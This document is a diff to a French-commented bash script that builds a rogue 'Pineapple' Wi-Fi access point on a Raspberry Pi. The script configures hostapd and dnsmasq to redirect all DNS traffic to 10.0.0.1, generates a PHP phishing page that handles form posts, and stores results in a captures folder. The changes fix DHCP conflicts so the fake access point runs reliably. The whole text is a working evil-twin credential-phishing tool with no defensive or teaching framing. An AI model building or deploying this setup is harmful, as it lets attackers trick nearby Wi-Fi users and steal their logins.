@@ -5,6 +5,7 @@ DIR="/home/pi/pineapple"
 WWW="$DIR/www"
 CAPTURE="$DIR/captures"
 INTERFACE_AP="wlan1"
+GATEWAY="10.0.0.1"
 
 echo "[*] Mise à jour et installation des dépendances..."
 sudo apt update
@@ -12,6 +13,18 @@ sudo apt install -y hostapd dnsmasq lighttpd php
 
 echo "[*] Création de l'arborescence..."
 mkdir -p "$WWW" "$CAPTURE"
+
+echo "[*] Configuration du système pour éviter les conflits DHCP..."
+
+# Empêche dhcpcd de gérer wlan1
+if ! grep -q "denyinterfaces $INTERFACE_AP" /etc/dhcpcd.conf; then
+    echo "denyinterfaces $INTERFACE_AP" | sudo tee -a /etc/dhcpcd.conf
+    sudo systemctl restart dhcpcd
+fi
+
+# Désactive dnsmasq système (évite conflit sur port 67)
+sudo systemctl stop dnsmasq 2>/dev/null
+sudo systemctl disable dnsmasq 2>/dev/null
 
 echo "[*] Génération de la page de phishing..."
 cat > "$WWW/index.php" << 'EOF'
@@ -40,7 +53,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 </html>
 EOF
 
-echo "[*] Génération du fichier hostapd.conf..."
+echo "[*] Génération de hostapd.conf..."
 cat > "$DIR/hostapd.conf" <<EOF
 interface=$INTERFACE_AP
 driver=nl80211
@@ -51,14 +64,15 @@ auth_algs=1
 ignore_broadcast_ssid=0
 EOF
 
-echo "[*] Génération du fichier dnsmasq.conf..."
+echo "[*] Génération de dnsmasq.conf..."
 cat > "$DIR/dnsmasq.conf" <<EOF
 interface=$INTERFACE_AP
+bind-interfaces
 dhcp-range=10.0.0.10,10.0.0.50,12h
 address=/#/10.0.0.1
 EOF
 
-echo "[*] Création du menu Pineapple..."
+echo "[*] Création du menu interactif Pineapple..."
 cat > "$DIR/pineapple_menu.sh" << 'EOF'
 #!/bin/bash
 
